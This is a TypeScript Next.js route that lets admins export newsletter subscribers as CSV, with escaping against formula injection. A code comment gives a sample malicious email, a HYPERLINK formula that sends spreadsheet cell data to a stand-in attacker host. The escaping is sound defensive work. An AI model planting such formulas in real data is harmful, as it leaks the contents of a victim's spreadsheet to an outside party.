import { NextResponse } from "next/server";
import { isAdmin } from "@/lib/auth";
import { listSubscribers } from "@/lib/subscribers";

// Neutralize CSV/formula injection: a subscriber email is untrusted input
// (anyone can submit one via the public subscribe form), and a value like
// `=HYPERLINK("http://evil.example?"&A1)@a.com` passes email validation.
// Opened in Excel/Sheets, a leading =/+/-/@/tab/CR is interpreted as a
// formula. Prefixing those with a single quote forces text interpretation.
function csvEscape(value: string): string {
  const safe = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
  return `"${safe.replace(/"/g, '""')}"`;
}

export async function GET() {
  if (!(await isAdmin())) {
    return new NextResponse("Not authorized.", { status: 401 });
  }

  const subscribers = await listSubscribers();
  const rows = ["email,subscribed_at"];
  for (const s of subscribers) {
    rows.push(`${csvEscape(s.email)},${csvEscape(s.createdAt.toISOString())}`);
  }

  return new NextResponse(rows.join("\n"), {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="subscribers.csv"`,
    },
  });
}
